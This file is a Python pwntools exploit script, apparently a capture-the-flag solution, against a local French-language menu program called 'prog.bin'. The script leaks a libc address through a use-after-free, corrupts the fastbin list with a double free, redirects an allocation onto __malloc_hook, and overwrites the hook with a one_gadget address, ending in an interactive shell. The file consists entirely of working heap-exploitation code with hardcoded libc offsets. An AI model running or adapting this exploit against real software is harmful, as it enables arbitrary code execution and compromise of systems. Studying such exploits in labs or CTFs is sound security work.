
from pwn import *
import struct


def read_menu(p):

    got = p.recvuntil('sortie')


def create_new_item(p, n, i):

    read_menu(proc)

    p.sendline('1')

    p.sendline(n)
    p.sendline(i)


def display_all_items(p):

    read_menu(proc)

    p.sendline('2')

    text = ''

    while True:

        line = p.recvline()

        if line.startswith('Que voulez-vous faire'):
            p.unrecv(line)
            break

        else:
            text += line

    return text


def delete_item(p, nb, tp):

    read_menu(proc)

    p.sendline('3')

    p.sendline(nb)
    p.sendline(tp)


def change_item_id(p, nb, new):

    read_menu(proc)

    p.sendline('5')

    p.sendline(nb)
    p.sendline(new)


def get_libc_leak(p):

    name = '*' * 0x80

    create_new_item(proc, name, '????')

    delete_item(proc, '0', '2')

    text = display_all_items(proc)

    leak = None

    for line in text.split('\n'):

        if 'nom : ' in line:

            leak = line.split('nom : ')[1]

            leak += (8 - len(leak)) * '\x00'

            leak = struct.unpack('<Q', leak)[0]

            break

    assert(leak)

    return leak


def run_shell(p, leak):

    #
    # Setup
    #

    # Use GDB to get these samples
    ref_offset = 0x7fa96af94b58 - 0x7fa96abfb000

    print('Reference Offset: %s' % hex(ref_offset))

    libc_base = leak - ref_offset

    print('Libc: %s' % hex(libc_base))

    libc = ELF("/lib/x86_64-linux-gnu/libc-2.24.so")

    malloc_hook = libc_base + libc.symbols['__malloc_hook']

    print('malloc_hook: %s' % hex(malloc_hook))

    one_gadget = libc_base + 0x3f35a

    print('Gadget: %s' % hex(one_gadget))

    #
    # Corrupt free fastbin list
    #

    create_new_item(proc, 'A' * 99, 'BBBB')

    create_new_item(proc, 'C' * 99, 'DDDD')

    create_new_item(proc, 'E' * 99, 'FFFF')

    create_new_item(proc, 'G' * 0x80, 'HHHH')

    delete_item(proc, '2', '1')

    delete_item(proc, '2', '2')

    delete_item(proc, '2', '1')

    # Put the malloc_hook address as allocable area

    target = struct.pack('<Q', malloc_hook - 0x23)

    tlen = target.index('\x00')

    target = target[:tlen]

    change_item_id(proc, '2', target)

    #
    # Overwrite the malloc_hook with the OneGadget address
    #

    create_new_item(proc, 'A' * (0x60 - 8), 'B')

    target = struct.pack('<Q', one_gadget)

    tlen = target.index('\x00')

    target = target[:tlen]

    change_item_id(proc, '5', 'AAA' + 'B' * 16 + target)


if __name__ == '__main__':

    proc = process([ 'prog.bin', '100' ])

    leak = get_libc_leak(proc)

    print('Leak: %s' % hex(leak))

    run_shell(proc, leak)

    # Trigger a new allocation

    read_menu(proc)

    proc.sendline('1')

    proc.interactive()
